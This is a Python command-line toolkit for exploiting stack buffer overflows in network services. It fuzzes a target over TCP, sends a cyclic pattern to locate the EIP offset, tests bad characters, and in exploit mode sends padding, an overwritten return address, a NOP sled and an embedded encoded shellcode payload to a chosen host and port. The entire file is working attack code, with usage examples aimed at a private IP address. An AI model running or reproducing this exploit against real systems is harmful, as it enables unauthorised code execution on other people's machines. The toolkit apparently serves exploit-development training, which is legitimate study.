import argparse
import binascii
import socket
import sys
import time
from string import ascii_uppercase, ascii_lowercase, digits

MAX_PATTERN_LENGTH = 20280

class MaxLengthException(Exception):
    pass

def fuzz(domain, port, prefix):
    print(f"[+] Starting fuzzing domain {domain} on port {port}")
    payload = prefix + "A" * 100
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s: 
                s.settimeout(5)
                s.connect((domain, int(port)))
                s.recv(1024)
                print(f"[+] Fuzzing with {len(payload) - len(prefix)} bytes.")
                s.send(bytes(payload, "latin-1"))
                s.recv(1024)
        except Exception as e:
            print(e)
            print(f"[!] Fuzzing crashed at {len(payload) - len(prefix)} bytes")
            sys.exit(0)
        payload += "A" * 100
        time.sleep(1)

def offset(domain, port, length, prefix):
    print("[+] Generating acyclic pattern...")

    if(length > MAX_PATTERN_LENGTH):
        raise MaxLengthException("[!] Error: Pattern length exceeds maximum of {0}".format(MAX_PATTERN_LENGTH))

    pattern = ""
    for upper in ascii_uppercase:
        for lower in ascii_lowercase:
            for digit in digits:
                if(len(pattern) < length):
                    pattern += upper + lower + digit
                else:
                    print(pattern[:length])
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    try:
                        s.settimeout(5)
                        s.connect((domain, int(port)))
                        s.send(bytes(prefix + pattern[:length] + "\r\n", "latin-1"))
                        print("[+] Sent Successfully")
                    except Exception as e:
                        print(e)
                        sys.exit(0)
                    return


def query_offset(EIP):
    print("[+] Querying offset...")
    EIP = bytearray.fromhex(EIP)
    EIP = EIP.decode()[::-1]
    pattern = ""
    for upper in ascii_uppercase:
        for lower in ascii_lowercase:
            for digit in digits:
                pattern += upper + lower + digit
                found_at = pattern.find(EIP)
                if found_at > -1:
                    print(f"[!] Exact match at offset {found_at}")
                    return
    print("f[!] EIP not found...")

def bad_characters(domain, port, offset, prefix):
    print("[+] Sending bytearray...")
    byte_arr = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    buffer = prefix + ("A" * int(offset)) + "BBBB" + byte_arr 
    try:
        s.settimeout(5)
        s.connect((domain, int(port)))
        s.send(bytes(buffer, "latin-1"))
        print("[+] Sent Successfully")
    except Exception as e:
        print(e)
        sys.exit(0)
       

def payload(domain, port, offset, retn, prefix):
    print("[+] Sending payload...")
    payload = ("\xfc\xbb\x89\x65\xe9\xc0\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3"
"\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x75\x8d\x6b\xc0\x85"
"\x4e\x0c\x48\x60\x7f\x0c\x2e\xe1\xd0\xbc\x24\xa7\xdc\x37\x68"
"\x53\x56\x35\xa5\x54\xdf\xf0\x93\x5b\xe0\xa9\xe0\xfa\x62\xb0"
"\x34\xdc\x5b\x7b\x49\x1d\x9b\x66\xa0\x4f\x74\xec\x17\x7f\xf1"
"\xb8\xab\xf4\x49\x2c\xac\xe9\x1a\x4f\x9d\xbc\x11\x16\x3d\x3f"
"\xf5\x22\x74\x27\x1a\x0e\xce\xdc\xe8\xe4\xd1\x34\x21\x04\x7d"
"\x79\x8d\xf7\x7f\xbe\x2a\xe8\xf5\xb6\x48\x95\x0d\x0d\x32\x41"
"\x9b\x95\x94\x02\x3b\x71\x24\xc6\xda\xf2\x2a\xa3\xa9\x5c\x2f"
"\x32\x7d\xd7\x4b\xbf\x80\x37\xda\xfb\xa6\x93\x86\x58\xc6\x82"
"\x62\x0e\xf7\xd4\xcc\xef\x5d\x9f\xe1\xe4\xef\xc2\x6d\xc8\xdd"
"\xfc\x6d\x46\x55\x8f\x5f\xc9\xcd\x07\xec\x82\xcb\xd0\x13\xb9"
"\xac\x4e\xea\x42\xcd\x47\x29\x16\x9d\xff\x98\x17\x76\xff\x25"
"\xc2\xd9\xaf\x89\xbd\x99\x1f\x6a\x6e\x72\x75\x65\x51\x62\x76"
"\xaf\xfa\x09\x8d\x38\x0f\xc8\x9c\x01\x67\xd6\x9e\x60\x24\x5f"
"\x78\xe8\xc4\x09\xd3\x85\x7d\x10\xaf\x34\x81\x8e\xca\x77\x09"
"\x3d\x2b\x39\xfa\x48\x3f\xae\x0a\x07\x1d\x79\x14\xbd\x09\xe5"
"\x87\x5a\xc9\x60\xb4\xf4\x9e\x25\x0a\x0d\x4a\xd8\x35\xa7\x68"
"\x21\xa3\x80\x28\xfe\x10\x0e\xb1\x73\x2c\x34\xa1\x4d\xad\x70"
"\x95\x01\xf8\x2e\x43\xe4\x52\x81\x3d\xbe\x09\x4b\xa9\x47\x62"
"\x4c\xaf\x47\xaf\x3a\x4f\xf9\x06\x7b\x70\x36\xcf\x8b\x09\x2a"
"\x6f\x73\xc0\xee\x8f\x96\xc0\x1a\x38\x0f\x81\xa6\x25\xb0\x7c"
"\xe4\x53\x33\x74\x95\xa7\x2b\xfd\x90\xec\xeb\xee\xe8\x7d\x9e"
"\x10\x5e\x7d\x8b\x10\x60\x81\x34")
    padding = "x\90" * 16
    retn = bytes.fromhex(retn).decode("latin-1")
    buffer = prefix + ("A" * int(offset)) + retn + padding + payload
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.settimeout(5)
        s.connect((domain, int(port)))
        s.send(bytes(buffer + "\r\n", "latin-1"))
        print("[+] Sent Successfully")
    except Exception as e:
        print(e)
        sys.exit(0)

def main():
    parser = argparse.ArgumentParser(description='Buffer Overflow Toolkit.', 
            usage="buff.py [mode] [options]",
            formatter_class=argparse.RawDescriptionHelpFormatter,
            epilog='''
FUZZING EXAMPLE: buff.py --fuzz -d 192.168.2.1 -p 8080
OFFSET EXAMPLE: buff.py --offset -d 192.168.2.1 -p 8080 -l 1986
QUERY EXAMPLE: buff.py --query -q 6F43396E
BAD CHARACTERS EXAMPLE: buff.py --chars -d 192.168.2.1 -p 8080 -o 1986
EXPLOIT EXAMPLE: buff.py --exploit -d 192.168.2.1 -p 8080 -o 1986 -r 'af115062'
                    ''')
    parser.add_argument('--fuzz', help='fuzzing mode', action='store_true')
    parser.add_argument('--offset', help='find offset mode', action='store_true')
    parser.add_argument('--query', help='query offset mode', action='store_true')
    parser.add_argument('--chars', help='bad characters mode', action='store_true')
    parser.add_argument('--exploit', help='exploit mode', action='store_true')
    parser.add_argument('-d', metavar='', help='specify the domain of the buffer overflow.')
    parser.add_argument('-p', metavar='', help='specify the port of the buffer overflow.')
    parser.add_argument('-l', metavar='', help='specify the max length of the offset.')
    parser.add_argument('-q', metavar='', help='specify the EIP to query offset of.')
    parser.add_argument('-o', metavar='', help='specify the offset.')
    parser.add_argument('-r', metavar='', help='specify the return value in the EIP register.')
    parser.add_argument('--prefix', metavar='', help='specify a prefix before the payload.', default='')

    
    args = parser.parse_args()
    if(args.fuzz):
        if(args.d == None):
            print("[!] Please specify a domain (-d) to fuzz.")
        if(args.p == None):
            print("[!] Please specify a port (-p) to fuzz.")
        if(args.d is not None and args.p is not None):
            fuzz(args.d, args.p, args.prefix)
    elif(args.offset):
        if(args.d == None):
            print("[!] Please specify a domain (-d) to find the offset of.")
        if(args.p == None):
            print("[!] Please specify a port (-p) to find the offset of.")
        if(args.l == None):
            print("[!] Please specify a max length of offset (-l).")
        if(args.d is not None and args.p is not None and args.l is not None):
            offset(args.d, args.p, int(args.l), args.prefix)
    elif(args.query):
        if(args.q == None):
            print("[!] Please specify an EIP to query (-q).")
        if(args.q):
            query_offset(args.q)
    elif(args.chars):
        if(args.d == None):
            print("[!] Please specify a domain (-d) to send bad characters to.")
        if(args.p == None):
            print("[!] Please specify a port (-p) to send bad characters to.")
        if(args.o == None):
            print("[!] Please specify an offset (-o) to send bad character to.")
        if(args.d is not None and args.p is not None and args.o is not None):
            bad_characters(args.d, args.p, args.o, args.prefix)
    elif(args.exploit):
        if(args.d == None):
            print("[!] Please specify a domain (-d) to send the payload to.")
        if(args.p == None):
            print("[!] Please specify a port (-p) to send the payload to.")
        if(args.o == None):
            print("[!] Please specify an offset (-o)")
        if(args.r == None):
            print("[!] Please specify a return value (-r)")
        if(args.d is not None and args.p is not None and args.o is not None and args.r is not None):
            payload(args.d, args.p, args.o, args.r, args.prefix)
main()
